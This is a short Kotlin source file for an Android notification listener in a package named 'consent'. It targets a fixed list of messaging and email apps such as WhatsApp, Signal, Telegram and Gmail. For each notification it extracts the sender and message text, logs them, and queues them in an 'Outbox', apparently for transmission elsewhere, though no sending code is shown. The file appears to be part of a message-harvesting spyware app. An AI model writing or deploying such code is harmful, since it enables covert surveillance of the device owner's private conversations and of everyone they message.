package com.vlink.consent

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class NotifListener : NotificationListenerService() {
    private val apps = setOf(
        "com.whatsapp", "org.telegram.messenger", "com.instagram.android", "com.viber.voip",
        "com.google.android.apps.messaging", "ir.ilmili.plus", "com.facebook.orca",
        "com.snapchat.android", "com.twitter.android", "com.linkedin.android",
        "com.microsoft.teams", "com.slack", "com.discord", "org.thoughtcrime.securesms",
        "com.google.android.gm", "com.android.mms", "com.samsung.android.messaging"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (sbn.packageName !in apps) return
        val e = sbn.notification?.extras ?: return
        val title = e.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
        val text = (e.getCharSequence(Notification.EXTRA_TEXT)
            ?: e.getCharSequence(Notification.EXTRA_BIG_TEXT))?.toString().orEmpty()
        if (title.isBlank() && text.isBlank()) return
        val p = JSONObject().put("app", sbn.packageName).put("title", title).put("text", text)
        EventLog.add(this, "notif", p)
        Outbox(this).put("notif", p)
    }
}
